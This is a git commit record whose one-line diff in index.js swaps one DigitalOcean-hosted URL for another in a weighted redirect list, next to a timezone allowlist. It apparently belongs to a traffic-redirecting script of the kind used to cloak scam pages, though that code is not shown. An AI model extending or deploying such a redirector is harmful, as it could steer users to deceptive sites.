b31d6e77a228a733c2f82d986c9fa62aa802a6f4
paalakash <palaksh452@gmail.com>
2026-07-08 09:10:03 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://orca-app-3shxa.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://hammerhead-app-q2muk.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
 
 ];
 
